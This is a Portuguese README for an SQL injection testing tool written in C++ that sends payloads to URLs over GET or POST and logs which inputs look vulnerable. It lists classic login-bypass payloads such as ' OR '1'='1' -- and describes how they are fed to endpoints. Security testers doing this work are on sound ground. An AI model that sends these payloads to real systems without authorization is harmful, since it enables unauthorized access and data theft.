# SQL Injection Tester

## Descrição

Este é um script em C++ desenvolvido para testar vulnerabilidades de SQL Injection em URLs fornecidas. Ele suporta tanto requisições GET quanto POST e pode processar corpos de requisição em formato JSON ou URL-encoded. O script também permite a adição de payloads personalizados através de um arquivo opcional.

## Funcionalidades

- Testa URLs para vulnerabilidades de SQL Injection.
- Suporta métodos HTTP GET e POST.
- Processa corpos de requisição em formato JSON e URL-encoded.
- Adiciona payloads personalizados a partir de um arquivo.
- Gera logs detalhados dos testes realizados.

## Pré-requisitos

- g++
- libcurl

## Compilação

Para compilar o script manualmente, utilize o seguinte comando:

```sh
g++ -o sql-injection-tester main.cpp -lcurl
```

## Instalação
```sh
git clone https://github.com/enigma-w-e-b/sql-injection-tester.git
cd sql-injection-tester
mkdir build
cd build
cmake ..
make
sudo make install
```

## Execução

```
sql-injection-tester
```


## Uso

### Execução com um arquivo CSV e payloads personalizados

Para executar o script usando um arquivo CSV e um arquivo de payloads personalizados, utilize o seguinte comando:

```sh
sql-injection-tester --csv ./urls.csv --payloads ./payloads.txt
```

### Formato do Arquivo CSV
O arquivo CSV deve ter o seguinte formato:

Para corpos de requisição em formato JSON:

``` 
http://localhost:3000/login|POST|{"username":"[test]", "password":"[test]"}
```
### Para corpos de requisição em formato URL-encoded:

```
http://localhost:3000/login|POST|username=[test]&password=[test]
```
## Formato do Arquivo de Payloads
### O arquivo de payloads deve conter um payload por linha, como no exemplo abaixo:

```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' ({
' OR 1=1
' OR 1=1 --
' OR 1=1 ({
' OR 1=1 /*
' OR 1=1 #
' OR ''=''
' = '
' OR 'a'='a
' OR ''=' --
' OR ''=' ({
' OR ''=' /*
' OR ''=' #
' OR ''='
```
## Saída
Os resultados dos testes serão exibidos no terminal com coloração apropriada para indicar sucesso ou falha. Além disso, os resultados serão salvos em um arquivo CSV chamado results.csv.

Exemplo de Saída:

```
PASS - no vulnerability detected for: http://localhost:3000/login with body: username=test&password=test
DANGER - possible sql injection found: http://localhost:3000/login with body: username=' OR '1'='1' --&password=' OR '1'='1' --
```

## Licença

Este projeto é distribuído sob a licença MIT. Consulte `LICENSE` para obter mais informações.

# Aviso

### Este script foi desenvolvido para fins educacionais e não deve ser usado para realizar ataques maliciosos.

## Autor

#### Este projeto foi desenvolvido por Enigma Web, um integrante da corporação Cipher Systems.

